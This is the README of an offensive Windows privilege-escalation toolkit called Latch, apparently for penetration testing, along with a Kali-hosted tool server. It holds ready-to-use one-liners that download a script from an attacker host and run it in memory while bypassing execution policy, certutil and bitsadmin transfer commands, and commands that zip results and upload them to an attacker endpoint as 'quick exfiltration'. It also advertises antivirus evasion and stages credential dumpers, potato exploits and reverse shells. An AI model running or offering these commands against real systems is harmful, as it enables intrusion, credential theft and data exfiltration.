# Latch

<p align="center">
  <b>Windows Privilege Escalation Enumeration Toolkit</b>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#usage">Usage</a> •
  <a href="#output">Output</a> •
  <a href="#tool-server">Tool Server</a>
</p>

---

A lightweight PowerShell enumeration script for Windows privilege escalation assessments, paired with a Kali-based tool server for seamless deployment.

## Features

- **Zero Dependencies** - Pure PowerShell, no external modules required
- **Defender Evasion** - Designed to avoid common AV signatures
- **Automated Alerts** - Highlights critical findings (token privileges, unquoted paths, MSI elevation)
- **Category-Based Tool Downloads** - Download only what you need (Enumeration, Credentials, TokenAbuse, AD, etc.)
- **Temp Directory Usage** - Tools downloaded to `%TEMP%\lt` by default, keeping filesystem clean
- **Flexible Output** - Individual files, zip compression, and remote upload support
- **100+ Tools** - Comprehensive collection of privesc and post-exploitation tools

## Quick Start

### On Kali (Attack Host)

```bash
git clone https://github.com/yourusername/Latch.git
cd Latch
./serve-tools.sh --download
```

### On Windows (Target)

```powershell
# Download and run with enumeration tools
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/Latch.ps1','s.ps1')"
powershell -ep bypass -c ".\s.ps1 -RemoteHost KALI_IP -DownloadTools Enumeration"

# Or run in memory (no file on disk)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Latch.ps1')"
```

## Usage

### Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-OutputDir` | Output directory for results | `.\LatchOutput` |
| `-RemoteHost` | IP of tool server for downloads | - |
| `-DownloadTools` | Download tools by category (see below) | - |
| `-ToolsDir` | Directory to download tools to | `$env:TEMP\lt` |
| `-Quiet` | Suppress informational output | `false` |
| `-Zip` | Compress output to zip file | `false` |
| `-Upload` | URL endpoint for result upload | - |
| `-Cleanup` | Delete output folder after zip/upload | `false` |

### Download Categories

| Category | Tools Included |
|----------|----------------|
| `All` | Everything in the `all/` folder (100+ tools) |
| `Enumeration` | WinPEAS, LinPEAS, SharpUp, Seatbelt, PowerUp, PrivescCheck, JAWS, Watson, pspy, accesschk |
| `Credentials` | LaZagne, Mimikatz, SharpDPAPI, SharpChrome, SharpWeb, Rubeus, Snaffler, SharpKatz |
| `TokenAbuse` | PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato, LocalPotato, RemotePotato0, CoercedPotato, GenericPotato, SharpEfsPotato |
| `AD` | SharpHound, RustHound, Certify, Whisker, PowerView, Kerbrute, PetitPotam, SharpLAPS, SharpGPOAbuse, KrbRelayUp |
| `Tunneling` | Chisel, Ligolo-ng, socat, netcat |
| `Impacket` | secretsdump, GetUserSPNs, GetNPUsers, psexec, wmiexec, atexec, dcomexec, ntlmrelayx, ticketer |
| `Shells` | Nishang reverse shells, PHP shells, netcat |

### Examples

```powershell
# Basic enumeration only
powershell -ep bypass -c ".\Latch.ps1"

# Download enumeration tools (to %TEMP%\lt)
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools Enumeration"

# Download token abuse tools (potatoes)
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools TokenAbuse"

# Download AD tools
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools AD"

# Download all tools
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools All"

# Download tools to a specific directory
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools Enumeration -ToolsDir C:\Users\Public\t"

# Quick exfiltration (zip, cleanup, minimal output)
powershell -ep bypass -c ".\Latch.ps1 -Zip -Cleanup -Quiet"

# Full automation with upload
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools All -Upload http://10.10.14.5:8080/upload -Cleanup"
```

### Alternative Transfer Methods

```powershell
# certutil
certutil -urlcache -split -f http://KALI_IP/Latch.ps1 s.ps1

# bitsadmin
bitsadmin /transfer j http://KALI_IP/Latch.ps1 %cd%\s.ps1
```

## Output

### Generated Files

| File | Contents |
|------|----------|
| `sysinfo.txt` | Current user, groups, privileges, system info, local accounts |
| `network.txt` | IP configuration, listening ports, routes, ARP, firewall state |
| `patches.txt` | Installed hotfixes and updates |
| `quickwins.txt` | PowerShell history, saved credentials, autologon settings |
| `unattend.txt` | Sysprep and unattend.xml file contents |
| `webconfigs.txt` | IIS configurations and connection strings |
| `services_*.txt` | Service enumeration and unquoted path detection |
| `schtasks_*.txt` | Scheduled tasks (privileged and full listing) |
| `autoruns.txt` | Startup programs and registry run keys |
| `alwaysinstallelevated.txt` | MSI elevation policy check |
| `software.txt` | Installed applications |
| `processes.txt` | Running processes with paths |
| `dll_hijack.txt` | Writable directories in PATH |
| `tree_all.txt` | Directory structure of key locations |

### Critical Finding Alerts

When high-value findings are detected, dedicated alert files are created:

| Alert File | Indicates |
|------------|-----------|
| `TOKEN_PRIVS_FOUND.txt` | SeImpersonate/SeAssignPrimaryToken enabled |
| `MSI_ELEVATED_FOUND.txt` | AlwaysInstallElevated misconfiguration |
| `UNQUOTED_PATHS_FOUND.txt` | Exploitable unquoted service paths |

### Review Priority

1. **Token Privileges** - Immediate SYSTEM via potato attacks
2. **MSI Elevation** - SYSTEM shell via malicious MSI
3. **Unquoted Paths** - Service binary hijacking
4. **Quick Wins** - Cleartext credentials, command history
5. **Services** - Weak permissions, writable paths

## Tool Server

The `serve-tools.sh` script provides a convenient way to host enumeration tools and serve them via HTTP. All files are created in `/tmp/tools` by default.

### Options

```
./serve-tools.sh [options]
  -s, --search DIR    Search directory for existing tools (default: /opt)
  -d, --dir DIR       Directory to serve from (default: /tmp/tools)
  -p, --port PORT     HTTP server port (default: 80)
  --download          Download missing tools from GitHub
  --download-only     Download tools without starting server
```

### Examples

```bash
# Search /opt for tools and serve them
./serve-tools.sh

# Download missing tools and serve (recommended)
./serve-tools.sh --download

# Use persistent storage instead of /tmp
./serve-tools.sh -d /opt/tools --download

# Custom port
./serve-tools.sh -p 8080 --download
```

### Server Directory Structure

```
/tmp/tools/
├── all/                    # Flat folder with symlinks to ALL tools
├── categories/
│   ├── Enumeration/        # WinPEAS, SharpUp, Seatbelt, etc.
│   ├── Credentials/        # Mimikatz, LaZagne, Rubeus, etc.
│   ├── TokenAbuse/         # All potatoes, PrintSpoofer
│   ├── AD/                 # SharpHound, Certify, PowerView, etc.
│   ├── Tunneling/          # Chisel, Ligolo-ng, socat
│   ├── Impacket/           # Python scripts
│   └── Shells/             # Reverse shells
├── WinPEAS/                # Individual tool folders
├── Mimikatz/
├── GodPotato/
└── Latch.ps1               # Automatically copied
```

### Included Tools (106 total)

| Category | Tools |
|----------|-------|
| **Windows Enumeration** | winPEAS, SharpUp, Seatbelt, PowerUp, PrivescCheck, JAWS, Watson, Sherlock |
| **Linux Enumeration** | linpeas, LinEnum, lse.sh, linux-exploit-suggester, pspy |
| **Credentials** | LaZagne, Mimikatz, SharpDPAPI, SharpChrome, SharpWeb, Rubeus, Snaffler, SharpKatz, SafetyKatz |
| **Print Spooler Abuse** | PrintSpoofer (32/64-bit) |
| **Potato Attacks** | GodPotato, JuicyPotato, JuicyPotatoNG, SweetPotato, RoguePotato, LocalPotato, RemotePotato0, CoercedPotato, GenericPotato, SharpEfsPotato |
| **Tunneling** | Chisel, Ligolo-ng, socat (Linux + Windows), netcat |
| **AD Tools** | SharpHound, RustHound, PowerView, Certify, Whisker, KrbRelayUp, SharpLAPS, SharpGPOAbuse, Kerbrute, Farmer |
| **ADCS/Coercion** | Certify, PetitPotam, ADCSPwn |
| **Impacket** | secretsdump, GetUserSPNs, GetNPUsers, psexec, wmiexec, smbexec, atexec, dcomexec, getTGT, getST, ticketer, ntlmrelayx, addcomputer, rbcd |
| **Utilities** | RunasCs, netcat, PsExec, procdump, accesschk |
| **Shells** | Nishang (PowerShell TCP), PHP reverse shell |

### Accessing Tools

```bash
# Single tool download
http://KALI_IP/all/winPEASx64.exe
http://KALI_IP/all/GodPotato-NET4.exe

# Category folder (for Latch.ps1 -DownloadTools)
http://KALI_IP/categories/Enumeration/
http://KALI_IP/categories/TokenAbuse/
```

## Sample Output

```
==============================================================
    Latch - Windows PrivEsc Enumeration
    Output: .\LatchOutput
    Admin: NO | Domain Joined: YES
==============================================================
[!] Not running as admin - some checks will be limited
[14:23:01][6%] [*] Gathering system information...
[14:23:03][6%] [+] System info saved to sysinfo.txt
[14:23:03][6%] [!!!] FOUND: SeImpersonate or SeAssignPrimaryToken enabled!
...
[14:23:15][94%] [*] Downloading tools to C:\Users\user\AppData\Local\Temp\lt...
[14:23:16][94%] [+] Downloaded winPEASx64.exe
[14:23:17][94%] [+] Downloaded SharpUp.exe
[14:23:18][100%] [+] Latch complete

============================================================
  LATCH COMPLETE
============================================================
  Output: .\LatchOutput
  Tools:  C:\Users\user\AppData\Local\Temp\lt

  CRITICAL FINDINGS:
    [!] Token privileges - check sysinfo.txt

  Review these files:
    type .\LatchOutput\sysinfo.txt
    type .\LatchOutput\quickwins.txt
    type .\LatchOutput\services_nonstandard.txt
```

## Requirements

- **Latch.ps1**: PowerShell 2.0+ (Windows 7/2008 R2 and later)
- **serve-tools.sh**: Bash 4.0+, Python 3, wget/curl

## Legal Disclaimer

This tool is provided for authorized security testing and educational purposes only. Users must ensure they have explicit permission before running this tool against any system. Unauthorized access to computer systems is illegal.

The authors assume no liability for misuse or damage caused by this tool.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <sub>Built for authorized security assessments</sub>
</p>
